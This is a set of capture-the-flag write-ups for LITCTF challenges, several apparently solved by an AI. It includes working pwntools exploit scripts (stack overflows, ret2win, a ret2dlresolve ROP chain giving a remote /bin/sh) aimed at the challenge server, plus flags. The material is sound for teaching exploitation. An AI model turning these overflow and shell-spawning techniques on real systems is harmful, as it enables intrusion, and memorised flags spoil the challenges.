shape_enc = bytes([0x1,0x1,0x1,0x1,0x0,0x1,0x0,0x0,0x1,0x1,0x0,0x0,0x1,0x0,0x0,0x1,0x0,0x1,0x1,0x1,0x1,0x0,0x0,0x1,0x0,0x1,0x0,0x0,0x1,0x1,0x0,0x1,0x0,0x1,0x1,0x0,0x0,0x0,0x1,0x1,0x1,0x0,0x0,0x1,0x0,0x0,0x1,0x1,0x1,0x0,0x1,0x1,0x1,0x0,0x0,0x0,0x1,0x0,0x0,0x1,0x0,0x0,0x0,0x1,0x1,0x0,0x0,0x1,0x0,0x1,0x0,0x1,0x0,0x0,0x0])
xored = bytes([0x7d,0x7a,0x56,0x4f,0x4d,0x57,0x47,0x42,0x7b,0x7a,0x7c,0x70,0x36,0x59,0x34,0x71,0x76,0x6b,0x61,0x39,0x72,0x63,0x3b,0x57,0x75,0x66,0x61,0x68,0x54,0x3f,0x3a,0x3d,0x70,0x5a,0x77,0x35,0x34])

class Node:
    __slots__ = ('depth','char','left','right')
    def __init__(self, depth):
        self.depth = depth; self.char = None
        self.left = None; self.right = None

def parse(idx, depth):
    if shape_enc[idx] == 0:
        return None, idx + 1
    node = Node(depth); idx += 1
    node.left, idx = parse(idx, depth + 1)
    node.right, idx = parse(idx, depth + 1)
    return node, idx

root, end = parse(0, 0)
preorder = []
def walk(n):
    if n: preorder.append(n); walk(n.left); walk(n.right)
walk(root)
for i, n in enumerate(preorder):
    n.char = xored[i] ^ n.depth

flag = []
def inorder(n):
    if n: inorder(n.left); flag.append(chr(n.char)); inorder(n.right)
inorder(root)
print(''.join(flag))
```

## Flag

```
LITCTF{y0u_3xpl0it3d_th3_b1n4ry_tr33}
```


# pwn/spiderman 

[Solved by AI.]

## Challenge
```
pwn/spiderman
insert spiderman meme here
connect via nc 136.115.87.65 31778
```

A local copy of the binary (`main`) is provided; the remote runs a slightly
different build (prompt: `Who is the best superhero? ` instead of
`What is your name? `), but with the same layout and same `win` function
address.

## Analysis

The binary is a non-PIE x86-64 ELF with three interesting functions:

- `win` at `0x4011f6` — prints `Congrats, %s`, then reads and prints `flag.txt`.
- `introduction` at `0x4012a7` — prints `Hello, %s`.
- `main` at `0x4012d5`:

```c
int main() {
  char buf[0x30];
  int (__fastcall *fn)(const char *);   // at rbp-0x10, i.e. offset 0x20 into buf
  memset(buf, 0, 0x30);
  fn = introduction;
  printf("Who is the best superhero? ");   // "What is your name? " in local build
  gets(buf);                              // unchecked stack overflow!
  fn(buf);                                // calls the function pointer with our input
  return 0;
}
```

### Vulnerability
`gets(buf)` has no bounds check. The buffer is 0x30 bytes on the stack, and the
function pointer `fn` sits exactly `0x20` bytes into it. Overflowing the buffer
lets us overwrite `fn` with the address of `win` (`0x4011f6`). Since `fn(buf)`
is invoked right after the read, `win` is called with our controlled input —
jumping straight to the flag-printing function.

Verification of the layout against the remote:
- Overwriting `fn` with `0x4012a7` (introduction) printed `Hello, AAAA...` —
  confirming the slot at offset `0x20` holds a called function pointer.
- The "best superhero" answer check is irrelevant: overwriting `fn` with `win`
  bypasses it entirely.

## Exploit

```python
from pwn import *

HOST = "136.115.87.65"
PORT = 31778
WIN = 0x4011f6

payload = b"A" * 0x20 + p64(WIN)   # 32 bytes of padding + win() address

io = remote(HOST, PORT)
io.recvuntil(b"Who is the best superhero? ")
io.sendline(payload)
print(io.recvall(timeout=5).decode(errors="replace"))
```

## Flag

```
LITCTF{p01nt3r-Po1ntEr-wh3re-4rE-y0U}
```

# pwn/greeter

[Solved by AI.]

**Flag:** `LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}`

## Binary overview

`main` is a 64-bit, **non-PIE** ELF (`e_type = ET_EXEC`), no stack canaries, NX enabled. It calls:

```c
greet();   // printf("whats your name? "); fgets(name,64,stdin); printf(name);  <- format string bug
greet2();  // printf("hows your day? "); gets(buf);                              <- buffer overflow
```

`win()` at `0x401236` opens `flag.txt` and prints it — a classic ret2win target.

## Vulnerability

In `greet2`:

```asm
sub rsp, 40h
lea rax, [rbp-40h]   ; 64-byte buffer
mov rdi, rax
call gets            ; unbounded read -> stack overflow
```

Stack layout: `buf[64]` (rbp-0x40) | saved rbp (8) | return address (8).

With no PIE and no canary, we just need **72 bytes of padding + address of `win`** to hijack the return address:

```
'A'*72 + p64(0x401236)
```

The format string bug in `greet` is a red herring for this challenge — no leak is needed.

## Exploit

```python
import socket

HOST, PORT = "136.115.87.65", 31780
WIN = 0x401236

s = socket.create_connection((HOST, PORT))
s.recvuntil(b"name? ")
s.sendall(b"a\n")                     # satisfy greet()

s.recvuntil(b"day? ")
s.sendall(b"A"*72 + WIN.to_bytes(8, "little") + b"\n")

print(s.recv(4096).decode(errors="replace"))
```

Output:

```
wonderful!

you won! heres your flag:
LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}
```

# crypto/faulty image 1 haha

haha Someone tampered with an image haha, and now we can't view it haha! Help the LIT team recover the image haha!

[Solved by AI.]


**Flag: `LITCTF{y0u_f1x3d_m3_85hf91j!}`**

## Challenge

We are given `corrupt.png`, a PNG that has been tampered with and can no longer be viewed. The description hints that someone "tampered" with the image ("haha Someone tampered with an image haha").

## Analysis

Opening the file in a hex editor shows a valid PNG signature and IHDR chunk:

```
00000000  89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52  .PNG........IHDR
00000010  00 00 01 90 00 00 00 96 08 02 00 00 00 7F F3 49  ...?...?.....��I
00000020  32 00 00 08 6B 49 44 41 54 78 9C ...
```

- IHDR: width `0x190` = 400, height `0x96` = 150, bit depth 8, color type 2 (truecolor RGB)
- One big IDAT chunk (length `0x86B` = 2155) followed by garbage and an IEND

Scattered through the file at regular intervals (every ~0x68 bytes) the ASCII bytes `68 61 68 61` — i.e. the string **"haha"** — were inserted into the compressed IDAT stream:

```
00000060  C6 77 1A 30 68 61 68 61 31 BE 20 66 18 11 0C 1A   ?w.0haha1? f.....
00000070  D0 19 89 1A 9C 40 02 C4 0D 07 4C 62 96 E1 26 2B   D.?.?@.?..Lb?��&+
```

There are also two trailing "haha" strings (one inside the IDAT data, one after IEND).

## Solution

Since "haha" bytes were *inserted* (not substituted), removing every occurrence of the byte sequence `68 61 68 61` restores the original file byte-for-byte:

```python
import zlib, struct

data = open("corrupt.png", "rb").read()

idx = []
start = 0
while True:
    i = data.find(b"haha", start)
    if i == -1:
        break
    idx.append(i)
    start = i + 4

fixed = data
for i in reversed(idx):
    fixed = fixed[:i] + fixed[i + 4:]

open("fixed.png", "wb").write(fixed)
```

There were **23** insertions (92 bytes). After removal the file validates perfectly:

```
0x8   b'IHDR' 13
0x21  b'IDAT' 2155
  crc stored: da9e37be  calc: 0xda9e37be   <-- CRC matches
  zlib decompress OK, len: 180150          <-- = 400*150*3 + 150 filter bytes
0x898 b'IEND' 0
```

The CRC-32 of the restored IDAT chunk matches the stored value, and the zlib stream decompresses cleanly to exactly the expected size (400 × 150 × 3 RGB bytes + 1 filter byte per row), confirming the reconstruction is exact.


![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAACWCAIAAAB/80kyAAAIa0lEQVR4nO3abWxddR3A8d/v3D6vvX26d103t2qUxT2RqEwTWIYQZWJUNoywjcQH4IURFxONb4AXJpolxncaMDG+IGYYEQwa0BmJGpxAAsQNB0xiluEmK/R5bW/b2/aen/nfe9ttt/e2vVmJ/LrvJ31x2p7+7/mf5Hz7P+de3b57rwCAB9H/+wAAYLkIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYANwgWADcIFgA3CBYAN672YOm+Tt3TtmLDra3Vm1ulYRWd1SuYke5p072d78Ix4epVI+9V0eGe+P7/LPyJ7mjS3a3h+w80yJkpEbG/j0pjpDckZSq26dgeH5SR2bK76cG0nM0WRrNXJ+zZC7qzOX7wbOlrN0R6MK1rIsvE9st+mYqXe8x3d9lzoxJbOJ69nbqjqWQKRXWq+9PakpD6yP44bK9PLD7xJSw6WgjHNY16a7vNmiYkfmpI3szq5ka9IyXDs+E8nJmyPwxXet3ijNpq9LYOrVHLxvbYgIzlwu9K5ripXrtq7aXx+aHsmQvRDzbZbwermAvgNFiV2MkJOzlRvCoe6g0X5OZGuSEZ//i8zJhuadQDKfvp2wt3C3vemZrfvii2kh/op9vk9FT87AX9ZKt+qs2eHlruwbUk7NhoeNFD6+xERnY0ld1LdyXlXDb+6wVJJqJvrV+YmKosOZruz896aNY6a6N7u+If/leSCfvLiD0/tswZ6dfXyZ8vxP+eDO3b025PDIQ53tt12RzPZm3un0GlEwtcoVVx83JTq/1+SGbC5WGnJmVwVhJa1QDRdzZIqjZsNUTR/e/TLY12PKwU7Pi4bmks7nO45+L+l2zP0+uTUh9F93VLfRQ/0lcoV/FXX+vS/IWtd6T0umZ7Ycz+Fn6r6+okl7+qWxJ6T1d0qFsPpCse5OEe3Z+KHtio17foXenowY16Y1hClhmtRCaWNYmwsSaSuvyZSSZkNFdmCp9tj+7rjr67oXi0czPSDfV2ejK81ulJvaahsHPJHCudFmAFrYZghQv1ren5b+3XA+Wv24V/uLXJ3shfh8fHi5fohxvtnxPSkije9Yzmwvby2POjMh2HtUw2Lv75/K+eHNRb2mVTvbTV2MvjMhlLzvSutN7dFW5gRfQLHXIiE/+kV17NSE2F2taovTAWP9yrX0zZsdH4oV69KX/Pu2C0EvETA9GhkKHom932m/wOyRrZ2hT6eE+XdNbOjy+ZcPzxI326r/PSGdn5rG7Ln58day6ekMvnWP6cvDGpW8svM4GrNFhVTCKhYQWR/5K1tWLhJ+G6+kemcEHK9qbC2moJ1S3gREZm7eXx8DwofzNVYI/225E+2dkcxvtgg72SCT98bVIqPTEzkXPZ8OApZ8WNwnJpwWglos932JH++Edv2aP9cm1+mmZyfjr08aVxvTN1cZAX8zeJ/TMlT9nDc6vrWvQb3dJeI7PV3OjlLBw2sEJWRbD6ZmRDXXFbJTxZryRnYQWR/5K+GTs1oR/K3+CMzIbrqjWhHbVhsTY2t7BKzi21Lo1UY1TtLWdQr+GZTn044Xp7p0T5UL4+UVyAzK+qtHINc1Zs2exlFSgzWon1dXYyX8OTGd22JmwcGw2rp/DOQ0a751ZYOQuLtXL0o832iz57uNdemwg5W7awhj11RU/ogNUWLHtuVG9tL1zz+pHmirdUiw9yPKO3ddq/wtVlpybDOPnRwkOxgslY1oUs6sfKrGKWkK7VzY3xz9+Jbu8MPWqICneg8v6GUNvwVl1WtxfuuZqqXr4tGK1U30x4q1REehpkOOygn+sopm1Tg/XO/ckiS6GN9bo1PMvTnc12PLRvcfH3FrzxCqzydwkTGh3qLmzamewib9XZiYyma6Nvr7fxWMZzxcc0yxeJxGKvZKJ9HXH+DX57ZkQPpqNrm4ofayi8ypOD0VfW2lgufDCiqtsiEf1SKn56WM5P2zvT+okWOzqsB9LRrqTlLP5VGN9+NxgdTOuupL1Z9eALRysRPz4Q5Z9Jhe3Hwj2pHR2O9qf0xlabsXC7t+RLPDUUHUjpzW12LmtHh5ee71e77Gdvr4r/hnhv0e2798pVLDxdzuTsTyPho0b5z0NU8bc7m/XjLYVte3Gs8BGkFTuwKxj8XT2wiiKJvt8TP3Dxk1x6S5s0JfgcFlbQ1R6sAt3WpJ9pD8uTS95tRFX0y2slNjtSZokHrBSCBcANHjMAcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgAXCDYAFwg2ABcINgARAv/gez3snh2p43vgAAAABJRU5ErkJggg==)

# pwn/key 

[Solved by AI.]

**Flag:** `LITCTF{whY_d1d_7hE_pr1s0ner_ch00s3_th3_w1n_0v3r_7h3_bread?}`

**Service:** `nc 136.115.87.65 31776`

## Binary analysis

`main` (PIE, no stack canary, NX, Full RELRO):

```c
int main() {
    char buf[32];                       // rbp-0x20
    printf("Key: %p\n", win);           // leaks win() address (PIE leak)
    *(int*)(buf + 0x28) = 0x61657262;   // writes "bread" at the saved RIP slot (flavor)
    *(short*)(buf + 0x2c) = 0x64;
    gets(buf);                          // classic stack overflow
    return 0;
}
```

`win`:

```c
int win() {
    return system("/bin/sh");
}
```

So this is a classic **ret2win**: `gets()` overflows the 32-byte buffer, `win()` is leaked by the program itself, and there is no canary. The "bread" write to `[rbp+8]` happens *before* `gets()`, so our overflow simply overwrites it — it's just a hint for the flag.

## The catch: stack alignment

Offset from buffer to saved RIP = 32 (buffer) + 8 (saved rbp) = **40 bytes**.

A naive `payload = 'A'*40 + p64(win)` reaches `win` but the process dies with
`Segmentation fault (core dumped)` — the shell never starts.

Why: `win` is a normal function that expects to be **called** (so that at its
entry `rsp % 16 == 8`). Our `ret` into it makes `rsp % 16 == 0`, misaligning the
stack by 8 bytes. `system()` then crashes inside glibc on a misaligned stack.

Fix: jump through a `ret` gadget first. The extra `ret` pops one more address and
realigns the stack exactly as a `call` would.

- `ret` gadget: `0x101a` (end of `.init_proc`)
- `win`: `0x1189`
- base = leaked_win − 0x1189

Final payload:

```
payload = b'A'*40 + p64(base + 0x101a) + p64(leaked_win)
```

## Exploit (`exploit.py`)

```python
from pwn import *

HOST, PORT = '136.115.87.65', 31776
WIN_OFF, RET_OFF = 0x1189, 0x101a

r = remote(HOST, PORT)
r.recvuntil(b'Key: ')
leak = int(r.recvline().strip(), 16)          # leaked win() address
ret = leak - WIN_OFF + RET_OFF                # ret gadget in the same PIE

r.sendline(b'A' * 40 + p64(ret) + p64(leak))  # align + ret2win
r.sendline(b'cat flag.txt')
print(r.recvall(timeout=3).decode())
```

## Result

```
LITCTF{whY_d1d_7hE_pr1s0ner_ch00s3_th3_w1n_0v3r_7h3_bread?}
```

# rev/sequence lock

## Challenge
An ELF binary accepts a flag of the form `LITCTF{...}` and checks it using a Fibonacci-based state machine.

## Reversing
Decompiling `main` (0x1249) shows:

1. Read a line; must start with `LITCTF{`, end with `}`, with exactly 20 inner bytes (`v6 == 20`).
2. State `v8` starts at `-86` = `0xFFFFFFAA` (low byte `0xAA`).
3. For each inner byte index `i` in `0..19`:
   - Compute a Fibonacci number with the classic two-variable loop starting from `(1,1)`, so `v9 = F(i)` with `F(0)=1, F(1)=1, F(2)=2, F(3)=3, ...`.
   - `v9 = (byte)(inner[i] + F(i))`
   - `v8 ^= v9` and require `(byte)v8 == byte_2140[i]`.

The comparison only uses the low byte (`cmp r9b, [r10+r8]` at 0x13CF), so the chain is simply:

```
state = 0xAA
for i in 0..19:
    state ^= (inner[i] + F(i)) & 0xFF
    assert (state & 0xFF) == byte_2140[i]
```

## Solving
Read the 20 target bytes from `.rodata` at `0x2140`:

```
cd ff 9b e9 9a a6 d6 ae 25 b3 0f f7 ea 40 90 de 42 3c f5 11
```

Invert the chain forward, tracking the state as the last target byte:

```
state = 0xAA
for i in 0..19:
    low = state ^ byte_2140[i]          # this must equal (inner[i] + F(i)) & 0xFF
    inner[i] = (low - F(i)) & 0xFF
    state = byte_2140[i]
```

`solve.py` implements this and yields `f1bon4cci_ch41ns_ftw`.

## Verification
```
$ echo "LITCTF{f1bon4cci_ch41ns_ftw}" | ./seqlock
== The Sequence Lock ==
...
flag> *click* The vault opens.
Correct flag!
```

## Flag
`LITCTF{f1bon4cci_ch41ns_ftw}`

# misc/read the rules

My friend made a cool 2-dimensional cellular automaton! Each cell's next state only depends on the state of its 8 neighboring cells, and the edges wrap back to the other side. He also said there's a secret message and gave me this list, but I'm not smart enough to understand. Help me!

[Solved by AI.]


**Flag: `LITCTF{th3_fl4g_1s_in_th3_ru1e5}`**

## Challenge description

A friend made a 2-dimensional cellular automaton where each cell's next state
depends only on its 8 neighbors (toroidal edges). We are given:

- `grid.gif` — 64 frames of the automaton running (384x384 px)
- `permutation.txt` — a permutation of the integers 0..255

There is a secret message hidden somewhere.

## Step 1: Figure out the real grid size

Extracting the 64 GIF frames (all 384x384, binary black/white) and inspecting
them shows every frame is made of uniform **6x6 pixel blocks**. That means the
GIF is just an upscaled rendering of a **64x64** cellular automaton:

```python
frames = [np.array(f.convert("L")) > 0 for f in ImageSequence.Iterator(im)]
L = np.stack(frames)[:, ::6, ::6]   # logical 64x64 states, 64 generations
```

## Step 2: Read the rules from the animation

Consecutive generations of the automaton are deterministic with respect to the
3x3 Moore neighborhood: for every 8-neighbor pattern (0..255) that appears,
the next state is always the same (0 conflicts over all 63 transitions, all
256 patterns observed). So we can recover the full 256-bit rule table `f`:

```python
for each transition t -> t+1:
    for each cell: pattern p = 8 neighbor bits (row-major), next = L[t+1]
f[p] = majority next-state over all occurrences of pattern p
```

## Step 3: The flag is inside the rules

The challenge title is the hint: the flag is in the **rule table** (256 bits =
32 bytes). The permutation is the key to unscramble it.

The rule value at author-indexed pattern `perm[i]` is the `i`-th bit of the
message. The author's neighbor bit order differs from the canonical one, so we
brute-force all 8! = 40320 neighbor orderings and all two bit-packing orders,
looking for a printable 32-byte ASCII result:

```python
for sigma in permutations(range(8)):
    f_author[q] = f[bitperm(q, sigma)]           # author's pattern indexing
    bits[i]     = f_author[perm[i]]              # message bit i
    if pack(bits, big-endian) is printable: flag!
```

Exactly one ordering matches:

- neighbor bit permutation `sigma = (1, 5, 0, 2, 3, 4, 6, 7)`
- big-endian bit packing
- message = `f_author[perm[0..255]]`

```
LITCTF{th3_fl4g_1s_in_th3_ru1e5}
```

## Solution script

See `solve.py` in this folder — it re-derives everything from scratch:
1. extract + downsample the GIF to the 64x64 grid,
2. infer the 256-bit rule table from the transitions,
3. apply the permutation to read the rule bits as a big-endian byte string.

```py
import numpy as np
from PIL import Image, ImageSequence

# 1. Load GIF frames
im = Image.open("grid.gif")
frames = []
for f in ImageSequence.Iterator(im):
    frames.append(np.array(f.convert("L")) > 0)
frames = np.stack(frames)
N, H, W = frames.shape

# 2. The images are 6x6-uniform blocks -> logical grid is 64x64
assert (frames.reshape(N, 64, 6, 64, 6) == frames.reshape(N, 64, 6, 64, 6)[:, :, :1, :, :1]).all()
L = frames[:, ::6, ::6]  # logical states, (64, 64, 64)

# 3. Infer the 8-neighbor rule table (canonical row-major order)
pos = [(-1, -1), (-1, 0), (-1, 1), (0, -1), (0, 1), (1, -1), (1, 0), (1, 1)]
counts = np.zeros((256, 2), dtype=np.int64)
for t in range(N - 1):
    a = L[t]
    P = np.pad(a.astype(np.uint32), 1, mode="wrap")
    idx = np.zeros((64, 64), dtype=np.uint32)
    for k, (di, dj) in enumerate(pos):
        idx += (P[1 + di:1 + di + 64, 1 + dj:1 + dj + 64]) << k
    flat = idx.ravel()
    fn = L[t + 1].ravel()
    for p in range(256):
        m = flat == p
        c = int(m.sum())
        if c:
            counts[p, 0] += c - int(fn[m].sum())
            counts[p, 1] += int(fn[m].sum())
assert not ((counts[:, 0] > 0) & (counts[:, 1] > 0)).any()  # deterministic rule
f = (counts[:, 1] > 0).astype(np.uint8)

# 4. Author's neighbor bit order sigma (found by searching for printable ASCII)
sigma = (1, 5, 0, 2, 3, 4, 6, 7)  # canonical position i holds author's bit sigma^-1? see smap
smap = np.zeros(256, dtype=np.uint8)
for q in range(256):
    p = 0
    for i in range(8):
        if (q >> i) & 1:
            p |= 1 << sigma[i]
    smap[q] = p
f_author = f[smap]  # rule value in author's pattern indexing

# 5. Read the permutation: message bit i = f_author[perm[i]], packed big-endian
perm = np.array([int(x) for x in open("permutation.txt").read().split()])
bits = f_author[perm]
msg = bytearray()
for i in range(0, 256, 8):
    v = 0
    for k in range(8):
        v |= int(bits[i + k]) << (7 - k)
    msg.append(v)
print(bytes(msg))
```


# web/head

## Challenge
A simple web page at `http://136.115.87.65:31784/` showing a "Head, shoulders, knees and toes" song, with a link to `/flag`. The category name "head" is a strong hint.

## Solution
`GET /flag` returned `405 Method Not Allowed` with the message "can't find anything here...". So the server intentionally blocks GET on `/flag`. The challenge name "head" hints at the HTTP `HEAD` method (which is like GET but returns no body).

Sending a HEAD request reveals the flag in a response header:

```bash
curl -i -X HEAD http://136.115.87.65:31784/flag
```

Response:

```
HTTP/1.1 200 OK
x-flag: LITCTF{y0u_f0umd_h3@d_239seaj9}
```

## Flag
`LITCTF{y0u_f0umd_h3@d_239seaj9}`


# crypto/carnival game


Since I solved all challenges from wave 2.1, I'm bored and decided to go to a carnival booth which wants me to guess 5 numbers correctly in a row before wave 2.2 gets released! To ensure that the booth isn't rigged, it published SHA256(server_seed). Can you please help me win?
connect via nc 136.115.87.65 31783


**Flag:** `LITCTF{t1me_s33d_1s_w34k_w1th_c0mm1tm3nt}`

## Description

A carnival booth asks us to guess 5 rolls (0-99) in a row. It publishes `SHA256(server_seed)` as a commitment to prove it's not rigged. Connect via `nc 136.115.87.65 31783`.

## Source analysis

The server runs `carnival-game.py`:

```python
def roll(seed, round):
    return int(sha(f"{seed}-{round}"), 16) % 100

def main():
    seed = random.Random(int(time.time())).randbytes(16).hex()
    print(f"commitment:{sha(seed)}")
    ...
    r = roll(seed, round)
```

Key observations:

- The `server_seed` is not random entropy — it is `random.Random(int(time.time())).randbytes(16).hex()`, i.e. it is **derived from the server start time**.
- The seed is fixed once per server process, so **every connection sees the same rolls**.
- The commitment `SHA256(seed)` lets us verify a candidate seed.

## Attack

Instead of brute-forcing the 128-bit seed, brute-force the 32-bit **timestamp**:

1. For each candidate timestamp `ts` (searching backward from "now"):
   - `seed = random.Random(ts).randbytes(16).hex()`
   - check `sha256(seed) == commitment`
2. The matching `ts` immediately recovers the seed.
3. With the seed, compute the 5 rolls: `int(sha(f"{seed}-{round}"), 16) % 100` for round 0..4.
4. Connect, send the 5 guesses, collect the flag.

`find_seed.py` found the seed in seconds (the server had been started the same day):

```
seed_ts: 1785721467
seed: 6423a77e79d3561be289b456e17cfa84
rolls: 72, 57, 29, 15, 66
```

The first roll (72) matched what we observed on a test connection, confirming the recovery. Guessing `72 57 29 15 66` gave the flag.


# pwn/librarian

**Challenge:** `pwn/librarian` — "We spent 50% of LIT's funding on this one library; put it to good use!"
**Service:** `nc 136.115.87.65 31782` — **Flag: `LITCTF{RET-2-LIBC-Is-sUp3R-4w2S0m3!!!}`**

## Binary analysis

`main` (amd64 ELF, **no PIE**, **no stack canary**, Partial RELRO, NX enabled):

```c
int main() {
    char buf[40];            // [rbp-0x30]
    ...
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    puts("Welcome to the LexMACS Library!");
    puts("...totally no secret library!");
    puts("What would you like to check out?");
    buf[read(0, buf, 0x100) - 1] = 0;          // <-- stack overflow, 40-byte buf!
    ...
    for (i = 0; i <= 1; i++)
        if (!strncmp(buf, books[i], strlen(books[i])))
            printf("Checked out: %s.\n", books[i]);   // "The Iliad" / "The Odyssey"
    ...
}
```

`read(0, buf, 0x100)` writes 0x100 bytes into a 40-byte stack buffer —
`0x38 = 56` bytes until the saved return address. Classic ret2dlresolve-friendly setup.

### Useful code

The binary ships a function literally named `pop_gag` at `0x4011d6`:

```
0x4011d6: pop rdi ; ret
0x4011d8: pop rsi ; ret
0x4011da: pop rdx ; ret
```

Plus:
- `read@plt` at `0x4010e4`
- PLT0 (lazy-binding entry) at `0x401020`: `push [GOT+8] (link_map); jmp [GOT+16] (_dl_runtime_resolve)`
- `.bss` at `0x404050`; writable page `0x404000-0x405000`

## Exploitation: ret2dlresolve (no libc leak needed)

Instead of leaking libc (remote glibc version unknown), we abuse the dynamic linker's
lazy resolution: write a **fake relocation entry + fake dynsym + string `"system"`**
into writable `.bss`, then jump to PLT0 with a crafted relocation index so
`_dl_runtime_resolve` resolves `system` for us and calls `system("/bin/sh")`.

### Stage 1 — stack overflow → ROP chain

```
offset 56:  ret                  ; 16-byte align system()'s entry stack
            pop rdi; ret; 0
            pop rsi; ret; 0x404070
            pop rdx; ret; 0x200
            read@plt             ; read(0, 0x404070, 0x200)  -- writes fake structures
            pop rdi; ret; &"/bin/sh"
            PLT0                 ; 0x401020
            reloc_index          ; points into the fake .rela.plt
            (dummy qword)        ; main() NULs buf[len-1], lands here safely
```

Alignment detail: glibc's `_dl_runtime_resolve_xsavec` trampoline leaves the stack
`8 mod 16` off from the entry value, so the resolved `system()` enters with
`rsp ≡ 0 (mod 16)` and immediately dies on `movaps [rsp], xmm1` in `do_system`.
Prepending one bare `ret` gadget shifts the stack so `system` enters aligned.

### Stage 2 — fake dynamic linker structures in .bss

pwntools' `Ret2dlresolvePayload(elf, 'system', ['/bin/sh'], data_addr=0x404070)`
lays out (in the RW page right past `.bss`):

```
0x404070  "system\0"                 (fake .dynstr entry)
0x404080  fake Elf64_Sym             (st_name -> "system")
0x404098  fake Elf64_Rela            (r_offset = 0x404070, r_info = (idx<<32)|7)
0x4040b0  ptr -> 0x4040b8 "/bin/sh\0"
```

The relocation index pushed on the stack makes `_dl_fixup` compute
`reloc = DT_JMPREL + index*24 = 0x404098`, read our fake `Elf64_Rela`, walk the fake
dynsym index to our `Elf64_Sym`, look up `"system"` in libc, and jump to it with
`rdi = "/bin/sh"` → interactive shell → `cat flag.txt`.

## Flag

```
LITCTF{RET-2-LIBC-Is-sUp3R-4w2S0m3!!!}
```

## Files

- `exploit.py` — final working exploit (prints the flag)

```py
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./main')
context.log_level = 'info'

HOST, PORT = '136.115.87.65', 31782

# Gadgets from the `pop_gag` function at 0x4011d6
POP_RDI = 0x4011d6
RET     = 0x4011d7      # bare `ret` for stack alignment
POP_RSI = 0x4011d8
POP_RDX = 0x4011da
READ_PLT = 0x4010e4     # read@plt.sec
PLT0     = 0x401020     # push [GOT+8]; jmp [GOT+16] -> _dl_runtime_resolve
DATA_ADDR = 0x404070    # just past .bss, still in the same RW page

# Fake .rela.plt / .dynsym / .dynstr structures written to .bss
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'],
                                 data_addr=DATA_ADDR)
binsh_ptr = dlresolve.data_addr + len(dlresolve.payload) - 8  # ptr to "/bin/sh\0"

chain = b''
chain += p64(RET)                          # 16-byte align system()'s stack
chain += p64(POP_RDI) + p64(0)             # read(0, DATA_ADDR, 0x200)
chain += p64(POP_RSI) + p64(DATA_ADDR)
chain += p64(POP_RDX) + p64(0x200)
chain += p64(READ_PLT)
chain += p64(POP_RDI) + p64(binsh_ptr)     # rdi = "/bin/sh"
chain += p64(PLT0)                         # trigger lazy resolution
chain += p64(dlresolve.reloc_index)
chain += p64(0)                            # dummy return addr (last byte gets NUL'd)

stage1 = b'A' * 56 + chain                 # 56 bytes to saved RIP
assert len(stage1) <= 0x100

io = remote(HOST, PORT)
io.recvuntil(b'check out?')
io.send(stage1)                            # stack overflow -> ROP
io.recvuntil(b'Invalid book')
io.send(dlresolve.payload)                 # second read() fills fake structures

io.sendline(b'cat flag.txt')
print(io.recvall(timeout=5).decode('latin-1'))
io.close()
```


- `exploit3.py` — same exploit with extra recon commands
```py
from pwn import *
import sys

context.binary = elf = ELF('/mnt/d/ctf101env/lit/lib/main')
context.log_level = 'info'

LOCAL = len(sys.argv) > 1 and sys.argv[1] == 'local'
BIN = '/mnt/d/ctf101env/lit/lib/main'

POP_RDI = 0x4011d6
POP_RSI = 0x4011d8
POP_RDX = 0x4011da
RET = 0x4011d7
READ_PLT = 0x4010e4
PLT0 = 0x401020
DATA_ADDR = 0x404070

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'],
                                 data_addr=DATA_ADDR)
binsh_ptr = dlresolve.data_addr + len(dlresolve.payload) - 8
log.info('reloc_index = %#x', dlresolve.reloc_index)
log.info('payload size = %#x', len(dlresolve.payload))
log.info('binsh ptr at %#x', binsh_ptr)

chain = b''
chain += p64(RET)                      # stack alignment for system()
chain += p64(POP_RDI) + p64(0)
chain += p64(POP_RSI) + p64(DATA_ADDR)
chain += p64(POP_RDX) + p64(0x200)
chain += p64(READ_PLT)
chain += p64(POP_RDI) + p64(binsh_ptr)
chain += p64(PLT0)
chain += p64(dlresolve.reloc_index)
chain += p64(0)                        # dummy ret addr for system

payload = b'A' * 56 + chain
log.info('stage1 length = %d', len(payload))

if LOCAL:
    io = process([BIN])
else:
    io = remote('136.115.87.65', 31782)

io.recvuntil(b'check out?')
io.send(payload)
io.recvuntil(b'Invalid book')
io.send(dlresolve.payload)

io.sendline(b'echo SHELLOK; ls -la; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null; find / -name "*flag*" -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null')
try:
    data = io.recvall(timeout=6)
    print('OUT:', repr(data))
except EOFError as e:
    print('EOF', e)
io.close()
```


# crypto/faulty image 4

Something's off about this image. The flag you see isn't the flag you want... again. This time, the hacker corrupted some of the pixels, separating them from encoding information together as a whole.

Hint: Some pixels have unusually small blue values, almost like they've been clipped to 4 bits. Which pixels exactly?


## Solution

